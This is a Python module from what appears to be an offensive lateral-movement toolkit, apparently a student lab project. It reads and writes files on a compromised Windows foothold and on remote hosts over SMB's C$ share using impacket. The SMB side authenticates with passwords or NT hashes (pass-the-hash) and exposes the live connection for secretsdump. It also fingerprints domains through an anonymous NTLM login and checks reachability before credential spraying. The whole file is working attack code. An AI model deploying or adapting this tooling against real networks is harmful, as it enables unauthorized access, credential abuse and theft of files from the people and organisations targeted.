# utils/bifrost.py

BANNER = r"""
                   ████  ███ █████ ████   ███   ████ █████   
                   █░░░█  █░░█░░░░░█░░░█ █ ░░█ █ ░░░░ ░█░░░  
                   ████░░ █░░████░░████░░█░ ░█░ ███░░░ █░░░░ 
                   █░░░█ ░█░░█░░░░ █░░█░ █░░ █░░ ░░█   █░░   
                   ████░░███░█░░░░░█░░░█░ ███ ░████░░  █░░   
                    ░░░░ ░░░░ ░░    ░░  ░  ░░░ ░░░░░ ░  ░░   
                     ░░░░  ░░░ ░     ░   ░  ░░░  ░░░░    ░   

                                                    ^^
        ^^      ..                                       ..
                []                                       []
              .:[]:_          ^^                       _:[]:.
            .: :[]: :-.                             .-: :[]: :.
          .: : :[]: : :`._                       _.': : :[]: : :.
        .: : : :[]: : : : :-._               _.-: : : : :[]: : : :.
    _..: : : : :[]: : : : : : :-._________.-: : : : : : :[]: : : : :-._
    _:_:_:_:_:_:[]:_:_:_:_:_:_:_:_:_:_:_:_:_:_:_:_:_:_:_:[]:_:_:_:_:_:_
    !!!!!!!!!!!![]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!![]!!!!!!!!!!!!!
    ^^^^^^^^^^^^[]^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^[]^^^^^^^^^^^^^
                []                                       []
                []                                       []
                []                                       []
     ~~^-~^_~^~/  \~^-~^~_~^-~_^~-^~_^~~-^~_~^~-~_~-^~_^/  \~^-~_~^-~~-
    ~ _~~- ~^-^~-^~~- ^~_^-^~~_ -~^_ -~_-~~^- _~~_~-^_ ~^-^~~-_^-~ ~^
       ~ ^- _~~_-  ~~ _ ~  ^~  - ~~^ _ -  ^~-  ~ _  ~~^  - ~_   - ~^_~
         ~-  ^_  ~^ -  ^~ _ - ~^~ _   _~^~-  _ ~~^ - _ ~ - _ ~~^ -
            ~^ -_ ~^^ -_ ~ _ - _ ~^~-  _~ -_   ~- _ ~^ _ -  ~ ^-
                 ~^~ - _ ^ - ~~~ _ - _ ~-^ ~ __- ~_ - ~  ~^_-
                     ~ ~- ^~ -  ~^ -  ~ ^~ - ~~  ^~ - ~

           ---------------------------------------------------------
                     Local & SMB File Access Bridge Module
                         Author: Bruno Paniagua García
           ---------------------------------------------------------
"""

import os
import socket
from io import BytesIO

from utils import ratatoskr as log

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None


DEFAULT_SMB_PORT = 445
DEFAULT_TIMEOUT = 5

# Subarboles ruidosos
_SKIP_FRAGMENTS = (
    r"\appdata\local\packages",
    r"\appdata\local\microsoft\windows\inetcache",
    r"\appdata\local\microsoft\windows\explorer",
    r"\node_modules",
    r"\apprepository",
)


class BaseAccess:

    def list_files(self, directory, recurse=True):
        raise NotImplementedError

    def file_size(self, path):
        raise NotImplementedError

    def read_file(self, path):
        raise NotImplementedError

    def write_file(self, path, data):
        raise NotImplementedError

    def close(self):
        pass


# ============================================================
# ACCESO LOCAL  (foothold PC_RRHH, contexto hrmanager)
# ============================================================

class LocalAccess(BaseAccess):
    """
    Filesystem local. Representa la recoleccion sobre el propio foothold,
    ejecutada como 'hrmanager' a traves del shell/payload. NO usa SMB:
    hrmanager es no-admin y no puede tocar C$ / ADMIN$.

    Solo devuelve datos utiles si el codigo corre EN el host foothold. Si
    Odin corre en Kali, estas rutas Windows no existen y el barrido sale
    vacio (degradacion silenciosa, sin error).
    """

    def list_files(self, directory, recurse=True):
        results = []

        if not os.path.isdir(directory):
            return results

        if recurse:
            for root, _dirs, files in os.walk(directory):
                for name in files:
                    results.append(os.path.join(root, name))
        else:
            for name in os.listdir(directory):
                full = os.path.join(directory, name)

                if os.path.isfile(full):
                    results.append(full)

        return results

    def file_size(self, path):
        try:
            return os.path.getsize(path)
        except OSError:
            return None

    def read_file(self, path):
        try:
            with open(path, "rb") as fh:
                return fh.read()
        except OSError:
            return None

    def write_file(self, path, data):
        try:
            if isinstance(data, str):
                data = data.encode("utf-8")

            with open(path, "wb") as fh:
                fh.write(data)

            return True

        except OSError as e:
            log.debug(
                f"write_file local fallo en {path}: "
                f"{type(e).__name__}: {e}"
            )

            return False


# ============================================================
# ACCESO SMB  (saltos con admin: PC_IT via ithelp, DC00 via admin.tfg)
# ============================================================

class SmbAccess(BaseAccess):
    """
    Filesystem remoto por SMB (impacket). Requiere admin local en el
    objetivo para usar el share C$. Se construye SIEMPRE via smb_access(),
    que autentica primero.
    """

    def __init__(self, connection, host, username="", secret="", domain="", nt_hash=""):
        self._conn = connection
        self.host = host
        self.username = username
        self.secret = secret
        self.domain = domain
        self.nt_hash = nt_hash

    @property
    def connection(self):
        """SMBConnection viva. La usa Mimir para secretsdump."""
        return self._conn

    @staticmethod
    def _split_path(path):
        # 'C:\\Users\\x\\f.txt' -> ('C$', 'Users\\x\\f.txt')
        drive, _, rest = path.partition(":\\")
        share = f"{drive}$"
        rest = rest.replace("/", "\\")
        return share, rest

    @staticmethod
    def _should_skip(path_lower):
        return any(frag in path_lower for frag in _SKIP_FRAGMENTS)

    def list_files(self, directory, recurse=True):
        results = []
        share, base = self._split_path(directory)
        self._walk(share, base, directory, results, recurse)
        return results

    def _walk(self, share, rel_dir, win_dir, results, recurse):
        pattern = (rel_dir.rstrip("\\") + "\\*").lstrip("\\") if rel_dir else "*"
        try:
            entries = self._conn.listPath(share, pattern)
        except Exception:
            return

        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue

            child_win = win_dir.rstrip("\\") + "\\" + name

            if entry.is_directory():
                if recurse and not self._should_skip(child_win.lower()):
                    child_rel = (rel_dir.rstrip("\\") + "\\" + name).lstrip("\\")
                    self._walk(share, child_rel, child_win, results, recurse)
            else:
                results.append(child_win)

    def file_size(self, path):
        share, rel = self._split_path(path)
        try:
            entries = self._conn.listPath(share, rel)
        except Exception:
            return None
        for entry in entries:
            if not entry.is_directory():
                return entry.get_filesize()
        return None

    def read_file(self, path):
        share, rel = self._split_path(path)
        buffer = BytesIO()
        try:
            self._conn.getFile(share, rel, buffer.write)
        except Exception:
            return None
        return buffer.getvalue()

    def write_file(self, path, data):
        share, rel = self._split_path(path)
        if isinstance(data, str):
            data = data.encode("utf-8")
        buffer = BytesIO(data)
        try:
            self._conn.putFile(share, rel, buffer.read)
            return True
        except Exception as e:
            log.debug(f"write_file SMB fallo en {path}: {type(e).__name__}: {e}")
            return False

    def close(self):
        try:
            self._conn.close()
        except Exception:
            pass


# ============================================================
# FACTORIAS
# ============================================================

def local_access():
    """Acceso al foothold (PC_RRHH, contexto hrmanager)."""
    return LocalAccess()

def resolve_domains(host):
    """
    Sondea el host y devuelve los dominios candidatos: cuenta local (nombre
    de equipo) y de dominio (dominio anunciado por el servidor). Se descubre,
    no se hardcodea: con SMB2/3 el nombre/dominio llegan en el reto NTLM, asi
    que forzamos un login anonimo que lo dispara (falla, pero antes el servidor
    ya ha revelado su identidad).
    """
    domains = [""]
    if SMBConnection is None:
        return domains

    try:
        probe = SMBConnection(remoteName=host, remoteHost=host,
                              sess_port=DEFAULT_SMB_PORT, timeout=DEFAULT_TIMEOUT)
    except Exception:
        return domains

    # Disparar el reto NTLM anonimo para poblar nombre/dominio del servidor.
    try:
        probe.login("", "")
    except Exception:
        pass

    try:
        name = probe.getServerName()
        if name and name not in domains:
            domains.append(name)

        for getter in ("getServerDNSDomainName", "getServerDomain"):
            try:
                value = getattr(probe, getter)()
            except Exception:
                value = None
            if value and value not in domains:
                domains.append(value)
    except Exception:
        pass
    finally:
        try:
            probe.close()
        except Exception:
            pass

    return domains

def is_reachable(host, port=DEFAULT_SMB_PORT, timeout=3):
    """TCP rapido: evita rociar credenciales contra un host que no responde."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def smb_access(host, username, secret=None, domain="", nt_hash=None):
    """
    Autentica por SMB con contraseña o con hash NT (pass-the-hash). Devuelve
    SmbAccess vivo si valida, None si no. Thor lo usa como test de credencial.
    """
    if SMBConnection is None:
        raise RuntimeError("impacket no esta instalado. Ejecuta: pip install impacket")

    try:
        conn = SMBConnection(remoteName=host, remoteHost=host, sess_port=DEFAULT_SMB_PORT, timeout=DEFAULT_TIMEOUT)
    except Exception as e:
        log.debug(f"smb_access sin conexion a {host}: {type(e).__name__}: {e}")
        return None

    try:
        if nt_hash:
            conn.login(username, "", domain, lmhash="", nthash=nt_hash)
        else:
            conn.login(username, secret or "", domain)
    except Exception as e:
        log.debug(f"smb_access login fallo {username}@{host} dom='{domain}': {type(e).__name__}: {e}")
        try:
            conn.close()
        except Exception:
            pass
        return None

    return SmbAccess(conn, host, username, secret or "", domain, nt_hash or "")